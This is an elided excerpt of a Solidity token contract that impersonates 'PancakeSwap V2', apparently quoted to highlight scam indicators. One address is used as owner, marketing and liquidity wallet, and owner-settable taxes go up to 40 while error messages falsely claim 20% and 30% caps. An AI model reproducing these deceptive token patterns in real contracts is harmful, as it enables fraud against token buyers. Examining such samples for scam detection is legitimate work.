...
contract PancakeSwap is Context, IERC20, Ownable {
    ...
    string private constant _name = "PancakeSwap V2";
    string private constant _symbol = "PancakeSwap V2";
    uint8 private constant _decimals = 9;

    address payable private marketingAddress =
        payable(0x11C6C77AeA9CC741F4B095C8318e0a04b383e975); // Marketing Address
    ...
    constructor() {
        address newOwner = address(0x11C6C77AeA9CC741F4B095C8318e0a04b383e975);
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair) {
            require(amount <= balanceOf(from) * 10 / 10);
        }
    ...
    address payable private liquidityAddress =
        payable(0x11C6C77AeA9CC741F4B095C8318e0a04b383e975); // Liquidity Address
        ...
        onlyOwner
    {
        ...
        require(_buyTaxFee + _buyLiquidityFee + _buyMarketingFee + _buyBurnFee <= 40, "Must keep taxes below 20%");
        ...
        onlyOwner
    {
        ...
        require(_sellTaxFee + _sellLiquidityFee + _sellMarketingFee + _sellBurnFee <= 40, "Must keep taxes below 30%");
